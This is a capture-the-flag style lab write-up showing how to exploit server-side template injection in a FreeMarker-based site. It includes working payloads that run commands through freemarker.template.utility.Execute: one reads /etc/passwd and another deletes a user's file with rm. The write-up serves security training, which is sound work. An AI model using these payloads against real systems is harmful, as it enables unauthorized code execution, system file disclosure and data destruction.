# Server-side template injection using documentation
* This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory
* You can log in to your own account using the following credentials" `content-manager:C0nt3ntM4n4g3r`

### 1. Enumerate the website as "content-manager"
* The provided account can edit a template on a post

![11](https://user-images.githubusercontent.com/53956303/155409113-55207589-f428-45ee-8fb3-483ff835fcfe.png)
### 2. Identify which template engine is using on the web page
* Try to put a test object ot identify which template engine is using. For example, put `${TESTVALUE}`
	* From the result, a `FreeMarker template` error message is given

![14](https://user-images.githubusercontent.com/53956303/155409977-c9baf3c6-6d29-406c-8126-c533f16efc89.png)
### 3. Exploit FreeMarker template enigne
* from [A Pentester's Guide to Server side template injection (SSTI) - Cobalt](https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti), an exploit fo a Java based template engine, Freemarker engine, is found.
```java
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
```
* Using the payload reveals the content of the `/etc/passwd` file.

![15](https://user-images.githubusercontent.com/53956303/155410519-d28d1b2c-df60-4ab6-abed-d7fff0d65de1.png)
* Modify the payload to delete the target file (/home/carlost/morale.txt)
```java
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("rm /home/carlos/morale.txt") }
```
* As a result, the target file is deleted and the lab is solved.

![16](https://user-images.githubusercontent.com/53956303/155410862-15f7c2d5-d527-4914-b85c-6989e1f7088f.png)
